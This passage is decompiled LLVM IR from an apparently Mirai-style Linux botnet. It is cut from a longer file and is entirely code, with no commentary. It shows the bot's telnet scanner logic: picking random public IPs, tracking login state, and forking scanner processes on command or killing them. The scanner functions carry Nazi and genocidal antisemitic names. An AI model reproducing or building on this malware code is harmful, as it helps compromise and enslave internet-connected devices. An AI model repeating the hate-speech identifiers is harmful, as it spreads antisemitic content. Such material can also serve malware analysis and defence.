  uselistorder i32 %stack_var_-628.250, { 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 18, 17, 12, 10, 8, 6, 5, 4, 3, 0, 2, 7, 1, 11, 9, 16, 19, 15, 14, 13 }
  uselistorder i32 %stack_var_-624.251, { 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 26, 24, 22, 21, 20, 16, 14, 11, 10, 9, 8, 7, 6, 5, 4, 3, 0, 2, 1, 13, 12, 15, 19, 18, 17, 25, 23, 28, 27 }
  uselistorder i32 %stack_var_-24.252, { 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 31 }
  uselistorder i32 %storemerge53, { 2, 13, 16, 15, 14, 12, 19, 18, 17, 11, 10, 9, 20, 8, 7, 6, 5, 24, 23, 22, 21, 4, 3, 29, 28, 32, 37, 36, 35, 34, 33, 31, 38, 30, 27, 26, 25, 43, 42, 44, 41, 40, 39, 49, 48, 51, 50, 47, 46, 45, 56, 55, 57, 54, 53, 52, 62, 61, 64, 63, 60, 59, 58, 69, 68, 70, 74, 73, 72, 75, 71, 67, 66, 65, 84, 85, 83, 82, 81, 80, 79, 78, 90, 89, 88, 87, 86, 92, 91, 77, 76, 1, 94, 93, 95, 0 }
  uselistorder i32 %v2_8050eb7, { 1, 0 }
  uselistorder i32 %v2_8050c76, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %v4_8050c4e, { 2, 1, 0 }
  uselistorder i32 %v2_8050c06, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge363, { 2, 1, 3, 0 }
  uselistorder i32 %v0_8050c09, { 2, 1, 0 }
  uselistorder i32 %v2_8050bd8, { 1, 0 }
  uselistorder i32 %v2_8050bbb, { 10, 11, 12, 9, 13, 8, 7, 14, 15, 16, 17, 22, 21, 20, 23, 19, 18, 24, 26, 27, 25, 33, 32, 31, 30, 34, 29, 28, 35, 36, 37, 38, 41, 40, 39, 42, 46, 47, 45, 44, 43, 2, 48, 3, 0, 1, 4, 6, 5 }
  uselistorder i32 %v2_8050baa, { 2, 1, 0, 3 }
  uselistorder i32 %stack_var_-56.0, { 3, 4, 0, 1, 2 }
  uselistorder i32 %v1_8050b09, { 1, 0, 2 }
  uselistorder i32 %v15_8050afb, { 2, 3, 1, 4, 0, 5, 6, 7 }
  uselistorder i8** %stack_var_-636, { 7, 4, 11, 8, 5, 12, 2, 6, 9, 3, 13, 10, 1, 0 }
  uselistorder i32* %stack_var_-604, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-596, { 3, 2, 1, 0, 4 }
  uselistorder i32* %stack_var_-316, { 1, 0, 2 }
  uselistorder i32* %stack_var_-332, { 5, 1, 9, 10, 8, 2, 6, 11, 3, 4, 7, 12, 0, 13, 14 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 5, 6, 4, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 62, 61, 63, 60, 64, 65, 66, 67, 68, 69, 70, 71, 72 }
  uselistorder i32* %eax.global-to-local, { 228, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 16, 17, 18, 19, 20, 21, 22, 14, 23, 24, 25, 26, 33, 34, 27, 28, 29, 30, 31, 32, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 87, 86, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 111, 109, 110, 112, 113, 114, 115, 116, 117, 118, 119, 120, 122, 121, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 146, 144, 145, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 208, 207, 209, 210, 211, 212, 213, 215, 216, 217, 218, 219, 214, 220, 222, 223, 224, 225, 226, 227, 238, 231, 229, 230, 221, 232, 233, 234, 235, 0, 237, 236 }
  uselistorder i32 ()* @get_telstate_host, { 1, 0 }
  uselistorder i32 (i32)* @contains_success, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @send, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @contains_fail, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @read_until_response, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @getsockopt, { 2, 1, 0 }
  uselistorder i32 (i32)* @reset_telstate, { 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @getRandomPublicIP, { 2, 1, 0 }
  uselistorder i8 6, { 1, 0 }
  uselistorder i8 5, { 1, 0 }
  uselistorder i32 %arg3, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg1, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8051d87, { 35, 1, 8, 9, 10, 11, 2, 12, 13, 3, 14, 15, 16, 17, 18, 4, 19, 20, 21, 22, 23, 24, 5, 25, 26, 27, 6, 28, 29, 30, 31, 32, 7, 33, 34, 0 }
  uselistorder label %dec_label_pc_8051d67, { 1, 0 }
  uselistorder label %dec_label_pc_8050ca2, { 1, 0 }
  uselistorder label %dec_label_pc_8050c65, { 1, 0 }
  uselistorder label %dec_label_pc_8050c59, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050bf5, { 1, 0 }
  uselistorder label %dec_label_pc_8050b30, { 1, 0 }
}

define i32 @SeigHeil(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8051dac = load i32, i32* @ebx, align 4
  store i32 %v0_8051dac, i32* %stack_var_-8, align 4
  %v1_8051db0 = call i32 @fork(i32 %v0_8051dac)
  store i32 84, i32* %stack_var_-44, align 4
  %v1_8051dbd = call i32 @sysconf(i32 84)
  %v2_8051ddb = mul i32 %v1_8051dbd, 100
  %v4_8051de1 = icmp eq i32 %v1_8051db0, 0
  br i1 %v4_8051de1, label %dec_label_pc_8051e62.preheader, label %dec_label_pc_8051de7

dec_label_pc_8051de7:                             ; preds = %entry
  store i32 %v1_8051db0, i32* @global_var_8074068.296, align 8
  br label %dec_label_pc_8051e6a

dec_label_pc_8051e62.preheader:                   ; preds = %entry
  %v5_8051e6820 = icmp sgt i32 %v1_8051dbd, 0
  br i1 %v5_8051e6820, label %dec_label_pc_8051e00, label %dec_label_pc_8051e6a

dec_label_pc_8051e00:                             ; preds = %dec_label_pc_8051e62.preheader, %dec_label_pc_8051e00
  %storemerge21 = phi i32 [ %v4_8051e5f, %dec_label_pc_8051e00 ], [ 0, %dec_label_pc_8051e62.preheader ]
  store i32 0, i32* %stack_var_-44, align 4
  %v2_8051e05 = call i32 @__GI_time(i32* null)
  store i32 %v2_8051e05, i32* @ebx, align 4
  %v1_8051e0f = call i32 @__libc_getpid(i32 0)
  %v0_8051e14 = load i32, i32* @ebx, align 4
  %v2_8051e14 = xor i32 %v0_8051e14, %v1_8051e0f
  store i32 %v2_8051e14, i32* @ebx, align 4
  %v0_8051e16 = load i32, i32* %stack_var_-44, align 4
  %v1_8051e16 = call i32 @getppid(i32 %v0_8051e16)
  %v0_8051e1b = load i32, i32* @ebx, align 4
  %v2_8051e1b = add i32 %v0_8051e1b, %v1_8051e16
  store i32 %v2_8051e1b, i32* %stack_var_-44, align 4
  %v1_8051e22 = call i32 @srand(i32 %v2_8051e1b)
  store i32 0, i32* %stack_var_-44, align 4
  %v2_8051e2f = call i32 @__GI_time(i32* null)
  store i32 %v2_8051e2f, i32* @ebx, align 4
  %v1_8051e39 = call i32 @__libc_getpid(i32 0)
  %v1_8051e3e = load i32, i32* @ebx, align 4
  %v2_8051e3e = xor i32 %v1_8051e3e, %v1_8051e39
  %v1_8051e41 = call i32 @init_rand(i32 %v2_8051e3e)
  store i32 300000, i32* %stack_var_-44, align 4
  %v3_8051e57 = call i32 @BurnTheJews(i32 300000, i32 %v2_8051ddb, i32 %arg1)
  %v4_8051e5f = add nuw nsw i32 %storemerge21, 1
  %exitcond = icmp eq i32 %v4_8051e5f, %v1_8051dbd
  br i1 %exitcond, label %dec_label_pc_8051e6a, label %dec_label_pc_8051e00

dec_label_pc_8051e6a:                             ; preds = %dec_label_pc_8051e62.preheader, %dec_label_pc_8051e00, %dec_label_pc_8051de7
  %v0_8051e6e = phi i32 [ %v1_8051db0, %dec_label_pc_8051de7 ], [ 0, %dec_label_pc_8051e62.preheader ], [ %v1_8051dbd, %dec_label_pc_8051e00 ]
  %v3_8051e6a = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8051e6a, i32* @ebx, align 4
  ret i32 %v0_8051e6e

; uselistorder directives
  uselistorder i32 %v4_8051e5f, { 1, 0 }
  uselistorder i32 %v2_8051e1b, { 1, 0 }
  uselistorder i32 %v1_8051db0, { 0, 2, 1 }
  uselistorder i32* %stack_var_-44, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 (i32)* @init_rand, { 0, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_8051e6a, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051e00, { 1, 0 }
}

define i32 @doScanner(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp24 = icmp slt i32 %arg3, 1
  %tmp25 = icmp eq i1 %tmp24, false
  br i1 %tmp25, label %dec_label_pc_8051e98, label %dec_label_pc_8051e7d

dec_label_pc_8051e7d:                             ; preds = %entry
  %v5_8051e7d = icmp ult i32* %stack_var_-44, inttoptr (i32 4 to i32*)
  store i1 %v5_8051e7d, i1* %cf.global-to-local, align 1
  %v3_8051e8b = call i32 @Send(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_806a3d0.297 to i32))
  %v0_8051e90 = load i32, i32* @esp, align 4
  %v2_8051e90 = icmp ugt i32 %v0_8051e90, -17
  store i1 %v2_8051e90, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8052013

dec_label_pc_8051e98:                             ; preds = %entry
  %v1_8051e9b = add i32 %arg4, 4
  %v5_8051e9b = icmp ugt i32 %arg4, -5
  store i1 %v5_8051e9b, i1* %cf.global-to-local, align 1
  %v1_8051e9e = inttoptr i32 %v1_8051e9b to i32*
  %v2_8051e9e = load i32, i32* %v1_8051e9e, align 4
  store i1 false, i1* @df, align 1
  %v4_8051eb2 = inttoptr i32 %v2_8051e9e to i8*
  store i32 %v2_8051e9e, i32* @esi, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_806a3ed.298 to i32), i32* @edi, align 4
  %v7_8051ebb = call i32 @_strncmp(i8* %v4_8051eb2, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_806a3ed.298, i32 0, i32 0), i32 3)
  %v8_8051ebb = urem i32 %v7_8051ebb, 2
  %v9_8051ebb = icmp eq i32 %v8_8051ebb, 0
  %v0_8051ebd = load i1, i1* %cf.global-to-local, align 1
  %v2_8051ebd = or i1 %v0_8051ebd, %v9_8051ebb
  %v3_8051ebd = zext i1 %v2_8051ebd to i32
  %v4_8051ebd = load i32, i32* @edx, align 4
  %v5_8051ebd = and i32 %v4_8051ebd, -256
  %v6_8051ebd = or i32 %v3_8051ebd, %v5_8051ebd
  %v7_8051ebd = xor i32 %v6_8051ebd, 1
  store i32 %v7_8051ebd, i32* %edx.global-to-local, align 4
  %v3_8051ec3 = and i32 %v7_8051ebb, -256
  %v1_8051ec5 = trunc i32 %v7_8051ebd to i8
  %v3_8051ec5 = zext i1 %v0_8051ebd to i8
  %v4_8051ec5 = sub nsw i8 %v1_8051ec5, %v3_8051ec5
  %v15_8051ec5 = icmp eq i8 %v4_8051ec5, 0
  %v20_8051ec5 = zext i8 %v4_8051ec5 to i32
  %v23_8051ec5 = or i32 %v20_8051ec5, %v3_8051ec3
  store i32 %v23_8051ec5, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8051ece = icmp eq i1 %v15_8051ec5, false
  br i1 %v1_8051ece, label %dec_label_pc_8051f4a, label %dec_label_pc_8051ed0

dec_label_pc_8051ed0:                             ; preds = %dec_label_pc_8051e98
  %v0_8051ed0 = load i32, i32* @global_var_8074068.296, align 8
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8051ed5 = icmp eq i32 %v0_8051ed0, 0
  %v1_8051ed7 = icmp eq i1 %v1_8051ed5, false
  br i1 %v1_8051ed7, label %dec_label_pc_8051f2c, label %dec_label_pc_8051ed9

dec_label_pc_8051ed9:                             ; preds = %dec_label_pc_8051ed0
  %v0_8051ed9 = load i32, i32* @esp, align 4
  %v5_8051ed9 = icmp ult i32 %v0_8051ed9, 12
  store i1 %v5_8051ed9, i1* %cf.global-to-local, align 1
  %v1_8051edf = call i32 @SeigHeil(i32 %arg1)
  %v0_8051ee7 = load i32, i32* @global_var_8074068.296, align 8
  %v1_8051eec = icmp eq i32 %v0_8051ee7, 0
  %v5_8051f13 = icmp ult i32* %stack_var_-44, inttoptr (i32 4 to i32*)
  store i1 %v5_8051f13, i1* %cf.global-to-local, align 1
  br i1 %v1_8051eec, label %dec_label_pc_8051f0e, label %dec_label_pc_8051ef0

dec_label_pc_8051ef0:                             ; preds = %dec_label_pc_8051ed9
  %v3_8051f01 = call i32 @Send(i32 %arg1, i32 ptrtoint ([43 x i8]* @global_var_806a3f0.300 to i32))
  %v0_8051f06 = load i32, i32* @esp, align 4
  %v2_8051f06 = icmp ugt i32 %v0_8051f06, -17
  store i1 %v2_8051f06, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8052013

dec_label_pc_8051f0e:                             ; preds = %dec_label_pc_8051ed9
  %v3_8051f1f = call i32 @Send(i32 %arg1, i32 ptrtoint ([51 x i8]* @global_var_806a41c.301 to i32))
  %v0_8051f24 = load i32, i32* @esp, align 4
  %v2_8051f24 = icmp ugt i32 %v0_8051f24, -17
  store i1 %v2_8051f24, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8052013

dec_label_pc_8051f2c:                             ; preds = %dec_label_pc_8051ed0
  %v0_8051f31 = load i32, i32* @esp, align 4
  %v5_8051f31 = icmp ult i32 %v0_8051f31, 4
  store i1 %v5_8051f31, i1* %cf.global-to-local, align 1
  %v3_8051f3d = call i32 @Send(i32 %arg1, i32 ptrtoint ([51 x i8]* @global_var_806a450.302 to i32))
  %v0_8051f42 = load i32, i32* @esp, align 4
  %v2_8051f42 = icmp ugt i32 %v0_8051f42, -17
  store i1 %v2_8051f42, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8052013

dec_label_pc_8051f4a:                             ; preds = %dec_label_pc_8051e98
  store i1 %v5_8051e9b, i1* %cf.global-to-local, align 1
  %v2_8051f50 = load i32, i32* %v1_8051e9e, align 4
  store i1 false, i1* @df, align 1
  %v4_8051f64 = inttoptr i32 %v2_8051f50 to i8*
  store i32 %v2_8051f50, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_806a483.303 to i32), i32* @edi, align 4
  %v7_8051f6d = call i32 @_strncmp(i8* %v4_8051f64, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_806a483.303, i32 0, i32 0), i32 4)
  %v8_8051f6d = urem i32 %v7_8051f6d, 2
  %v9_8051f6d = icmp eq i32 %v8_8051f6d, 0
  %v0_8051f6f = load i1, i1* %cf.global-to-local, align 1
  %v2_8051f6f = or i1 %v0_8051f6f, %v9_8051f6d
  %v3_8051f6f = zext i1 %v2_8051f6f to i32
  %v4_8051f6f = load i32, i32* %edx.global-to-local, align 4
  %v5_8051f6f = and i32 %v4_8051f6f, -256
  %v6_8051f6f = or i32 %v3_8051f6f, %v5_8051f6f
  %v7_8051f6f = xor i32 %v6_8051f6f, 1
  store i32 %v7_8051f6f, i32* %edx.global-to-local, align 4
  %v1_8051f77 = trunc i32 %v7_8051f6f to i8
  %v3_8051f77 = zext i1 %v0_8051f6f to i8
  %v15_8051f77 = icmp eq i8 %v1_8051f77, %v3_8051f77
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8051f80 = icmp eq i1 %v15_8051f77, false
  br i1 %v1_8051f80, label %dec_label_pc_8051ffd, label %dec_label_pc_8051f82

dec_label_pc_8051f82:                             ; preds = %dec_label_pc_8051f4a
  %v0_8051f82 = load i32, i32* @global_var_8074068.296, align 8
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8051f87 = icmp eq i32 %v0_8051f82, 0
  br i1 %v1_8051f87, label %dec_label_pc_8051fe2, label %dec_label_pc_8051f8b

dec_label_pc_8051f8b:                             ; preds = %dec_label_pc_8051f82
  %v0_8051f90 = load i32, i32* @esp, align 4
  %v5_8051f90 = icmp ult i32 %v0_8051f90, 8
  store i1 %v5_8051f90, i1* %cf.global-to-local, align 1
  %v3_8051f96 = call i32 @kill(i32 %v0_8051f82, i32 9)
  %v1_8051f9e = icmp eq i32 %v3_8051f96, 0
  %v1_8051fa0 = icmp eq i1 %v1_8051f9e, false
  %v5_8051fcc = icmp ult i32* %stack_var_-44, inttoptr (i32 4 to i32*)
  store i1 %v5_8051fcc, i1* %cf.global-to-local, align 1
  br i1 %v1_8051fa0, label %dec_label_pc_8051fc7, label %dec_label_pc_8051fa2

dec_label_pc_8051fa2:                             ; preds = %dec_label_pc_8051f8b
  %v3_8051fb3 = call i32 @Send(i32 %arg1, i32 ptrtoint ([42 x i8]* @global_var_806a488.304 to i32))
  %v0_8051fb8 = load i32, i32* @esp, align 4
  %v2_8051fb8 = icmp ugt i32 %v0_8051fb8, -17
  store i1 %v2_8051fb8, i1* %cf.global-to-local, align 1
  store i32 0, i32* @global_var_8074068.296, align 8
  br label %dec_label_pc_8052013

dec_label_pc_8051fc7:                             ; preds = %dec_label_pc_8051f8b
  %v3_8051fd8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([50 x i8]* @global_var_806a4b4.305 to i32))
  %v0_8051fdd = load i32, i32* @esp, align 4
  %v2_8051fdd = icmp ugt i32 %v0_8051fdd, -17
  store i1 %v2_8051fdd, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8052013

dec_label_pc_8051fe2:                             ; preds = %dec_label_pc_8051f82
  %v0_8051fe7 = load i32, i32* @esp, align 4
  %v5_8051fe7 = icmp ult i32 %v0_8051fe7, 4
  store i1 %v5_8051fe7, i1* %cf.global-to-local, align 1
  %v3_8051ff3 = call i32 @Send(i32 %arg1, i32 ptrtoint ([47 x i8]* @global_var_806a4e8.306 to i32))
  %v0_8051ff8 = load i32, i32* @esp, align 4
  %v2_8051ff8 = icmp ugt i32 %v0_8051ff8, -17
  store i1 %v2_8051ff8, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8052013

dec_label_pc_8051ffd:                             ; preds = %dec_label_pc_8051f4a
  %v0_8051ffd = load i32, i32* @esp, align 4
  %v5_8051ffd = icmp ult i32 %v0_8051ffd, 4
  store i1 %v5_8051ffd, i1* %cf.global-to-local, align 1
  %v3_805200b = call i32 @Send(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_806a3d0.297 to i32))
  %v0_8052010 = load i32, i32* @esp, align 4
  %v2_8052010 = icmp ugt i32 %v0_8052010, -17
  store i1 %v2_8052010, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8052013

dec_label_pc_8052013:                             ; preds = %dec_label_pc_8051fe2, %dec_label_pc_8051fc7, %dec_label_pc_8051fa2, %dec_label_pc_8051f2c, %dec_label_pc_8051f0e, %dec_label_pc_8051ef0, %dec_label_pc_8051e7d, %dec_label_pc_8051ffd
  %v0_8052019 = phi i32 [ %v3_8051ff3, %dec_label_pc_8051fe2 ], [ %v3_8051fd8, %dec_label_pc_8051fc7 ], [ %v3_8051fb3, %dec_label_pc_8051fa2 ], [ %v3_8051f3d, %dec_label_pc_8051f2c ], [ %v3_8051f1f, %dec_label_pc_8051f0e ], [ %v3_8051f01, %dec_label_pc_8051ef0 ], [ %v3_8051e8b, %dec_label_pc_8051e7d ], [ %v3_805200b, %dec_label_pc_8051ffd ]
  ret i32 %v0_8052019

; uselistorder directives
  uselistorder i1 %v0_8051f6f, { 1, 0 }
  uselistorder i1 %v0_8051ebd, { 1, 0 }
  uselistorder i32 %v7_8051ebb, { 1, 0 }
  uselistorder i1* %cf.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 12, 13, 14, 16, 15, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32 %arg1, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8052013, { 7, 0, 1, 2, 3, 4, 5, 6 }
}

define i32 @proc_find() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  %tmp15 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-540 = alloca i32, align 4
  %stack_var_-28 = alloca i8*, align 4
  %stack_var_-556 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805201a = load i32, i32* @ebp, align 4
  store i32 %v0_805201a, i32* %stack_var_-4, align 4
  %v4_805201a = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_805201a, i32* @ebp, align 4
  %v2_805202b = call i32 @__GI_opendir(i32 ptrtoint ([6 x i8]* @global_var_806a517.307 to i32))
  %v4_8052036 = icmp eq i32 %v2_805202b, 0
  %v1_805203a = icmp eq i1 %v4_8052036, false
  br i1 %v1_805203a, label %dec_label_pc_8052149.preheader, label %dec_label_pc_8052040

dec_label_pc_8052149.preheader:                   ; preds = %entry
  %v15_805201d = ptrtoint i32* %stack_var_-556 to i32
  %v2_805206a = ptrtoint i8** %stack_var_-28 to i32
  %v2_8052094 = ptrtoint i32* %stack_var_-540 to i32
  %v1_8052141 = inttoptr i32 %tmp15 to i16*
  br label %dec_label_pc_8052149.outer

dec_label_pc_8052040:                             ; preds = %entry
  %v3_8052048 = call i32 @perror(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_806a51d.308, i32 0, i32 0))
  br label %dec_label_pc_805217c

dec_label_pc_805205f:                             ; preds = %dec_label_pc_8052149
  %v1_8052062 = add i32 %v0_805214f, 11
  store i32 %v1_8052062, i32* %edx.global-to-local, align 4
  %v1_8052068 = add i32 %v0_8052154, 8
  %v2_8052068 = inttoptr i32 %v1_8052068 to i32*
  store i32 10, i32* %v2_8052068, align 4
  %v2_805206d = add i32 %v0_8052154, 4
  %v3_805206d = inttoptr i32 %v2_805206d to i32*
  store i32 %v2_805206a, i32* %v3_805206d, align 4
  %v0_805206e = load i32, i32* %edx.global-to-local, align 4
  %v3_805206e = inttoptr i32 %v0_8052154 to i32*
  store i32 %v0_805206e, i32* %v3_805206e, align 4
  %v1_805206f = call i32 @strtol(i32 %v0_805214f)
  %v0_8052074 = load i32, i32* @esp, align 4
  %v1_8052074 = add i32 %v0_8052074, 16
  %v3_805207a = load i8*, i8** %stack_var_-28, align 4
  %v2_805207d = load i8, i8* %v3_805207a, align 1
  %v4_805207f = icmp eq i8 %v2_805207d, 0
  %v1_8052081 = icmp eq i1 %v4_805207f, false
  br i1 %v1_8052081, label %dec_label_pc_8052149, label %dec_label_pc_8052087

dec_label_pc_8052087:                             ; preds = %dec_label_pc_805205f
  %v5_8052087 = add i32 %v0_8052074, 12
  %v6_8052087 = inttoptr i32 %v5_8052087 to i32*
  store i32 %v1_805206f, i32* %v6_8052087, align 4
  %v1_805208a = add i32 %v0_8052074, 8
  %v2_805208a = inttoptr i32 %v1_805208a to i32*
  store i32 ptrtoint ([18 x i8]* @global_var_806a52e.309 to i32), i32* %v2_805208a, align 4
  %v1_805208f = add i32 %v0_8052074, 4
  %v2_805208f = inttoptr i32 %v1_805208f to i32*
  store i32 512, i32* %v2_805208f, align 4
  %v3_805209a = inttoptr i32 %v0_8052074 to i32*
  store i32 %v2_8052094, i32* %v3_805209a, align 4
  %v3_805209b = call i32 @__GI_snprintf(i32 %v1_805206f, i32 %stack_var_-12.0.ph4, i32 %stack_var_-8.1.ph)
  %v0_80520a0 = load i32, i32* @esp, align 4
  %v1_80520a6 = add i32 %v0_80520a0, 4
  %v2_80520a6 = inttoptr i32 %v1_80520a6 to i32*
  store i32 ptrtoint ([2 x i8]* @global_var_806915a.88 to i32), i32* %v2_80520a6, align 4
  store i32 %v2_8052094, i32* @eax, align 4
  %v3_80520b1 = inttoptr i32 %v0_80520a0 to i32*
  store i32 %v2_8052094, i32* %v3_80520b1, align 4
  %v2_80520b2 = call i32 @__GI_fopen(i32 %v1_805206f, i32 %stack_var_-12.0.ph4)
  %v0_80520b7 = load i32, i32* @esp, align 4
  %v1_80520b7 = add i32 %v0_80520b7, 16
  %v4_80520bd = icmp eq i32 %v2_80520b2, 0
  br i1 %v4_80520bd, label %dec_label_pc_8052149.outer3, label %dec_label_pc_80520c7

dec_label_pc_80520c7:                             ; preds = %dec_label_pc_8052087
  %v5_80520ca = add i32 %v0_80520b7, 8
  %v6_80520ca = inttoptr i32 %v5_80520ca to i32*
  store i32 %v2_80520b2, i32* %v6_80520ca, align 4
  %v1_80520cd = add i32 %v0_80520b7, 4
  %v2_80520cd = inttoptr i32 %v1_80520cd to i32*
  store i32 512, i32* %v2_80520cd, align 4
  %v3_80520d8 = inttoptr i32 %v0_80520b7 to i32*
  store i32 %v2_8052094, i32* %v3_80520d8, align 4
  %v2_80520d9 = load i32, i32* %stack_var_-4, align 4
  %v3_80520d9 = call i32 @fgets(i32 %v2_80520b2, i32 %stack_var_-8.1.ph, i32 %v2_80520d9)
  %v0_80520de = load i32, i32* @esp, align 4
  %v1_80520e1 = icmp eq i32 %v3_80520d9, 0
  br i1 %v1_80520e1, label %dec_label_pc_805213b, label %dec_label_pc_80520e5

dec_label_pc_80520e5:                             ; preds = %dec_label_pc_80520c7
  %v1_80520e8 = add i32 %v0_80520de, 4
  %v2_80520e8 = inttoptr i32 %v1_80520e8 to i32*
  store i32 ptrtoint (i32* @global_var_806a540.310 to i32), i32* %v2_80520e8, align 4
  store i32 %v2_8052094, i32* @eax, align 4
  %v3_80520f3 = inttoptr i32 %v0_80520de to i32*
  store i32 %v2_8052094, i32* %v3_80520f3, align 4
  %v2_80520f4 = call i32 @__GI_strtok(i32 %v2_80520b2, i32 %stack_var_-8.1.ph)
  store i32 %v2_80520f4, i32* @eax, align 4
  %v0_80520f9 = load i32, i32* @esp, align 4
  %v5_8052102 = add i32 %v0_80520f9, 4
  %v6_8052102 = inttoptr i32 %v5_8052102 to i32*
  %v6_8052105 = inttoptr i32 %v0_80520f9 to i32*
  store i32 %v2_80520f4, i32* %v6_8052105, align 4
  %v1_8052108 = inttoptr i32 %v2_80520f4 to i8*
  %v2_8052108 = call i32 @__GI_strcoll(i8* %v1_8052108)
  %v0_805210d = load i32, i32* @esp, align 4
  %v1_8052110 = icmp eq i32 %v2_8052108, 0
  %v1_8052112 = icmp eq i1 %v1_8052110, false
  br i1 %v1_8052112, label %dec_label_pc_805213b, label %dec_label_pc_8052114

dec_label_pc_8052114:                             ; preds = %dec_label_pc_80520e5
  %v6_8052117 = inttoptr i32 %v0_805210d to i32*
  store i32 %v2_80520b2, i32* %v6_8052117, align 4
  %v1_805211a = inttoptr i32 %v2_80520f4 to i16*
  %v2_805211a = call i32 @__GI_fclose(i16* %v1_805211a)
  %v0_805211f = load i32, i32* @esp, align 4
  %v6_8052125 = inttoptr i32 %v0_805211f to i32*
  store i32 %v2_805202b, i32* %v6_8052125, align 4
  %v1_8052128 = inttoptr i32 %v2_80520f4 to i32*
  %v2_8052128 = call i32 @__GI_closedir(i32* %v1_8052128)
  br label %dec_label_pc_805217c

dec_label_pc_805213b:                             ; preds = %dec_label_pc_80520e5, %dec_label_pc_80520c7
  %v0_805213b.in = phi i32 [ %v0_80520de, %dec_label_pc_80520c7 ], [ %v0_805210d, %dec_label_pc_80520e5 ]
  %stack_var_-8.0 = phi i32 [ %stack_var_-8.1.ph, %dec_label_pc_80520c7 ], [ %v2_80520f4, %dec_label_pc_80520e5 ]
  %v6_805213e = inttoptr i32 %v0_805213b.in to i32*
  store i32 %v2_80520b2, i32* %v6_805213e, align 4
  %v2_8052141 = call i32 @__GI_fclose(i16* %v1_8052141)
  %v0_8052146 = load i32, i32* @esp, align 4
  %v1_8052146 = add i32 %v0_8052146, 16
  br label %dec_label_pc_8052149.outer

dec_label_pc_8052149.outer:                       ; preds = %dec_label_pc_8052149.preheader, %dec_label_pc_805213b
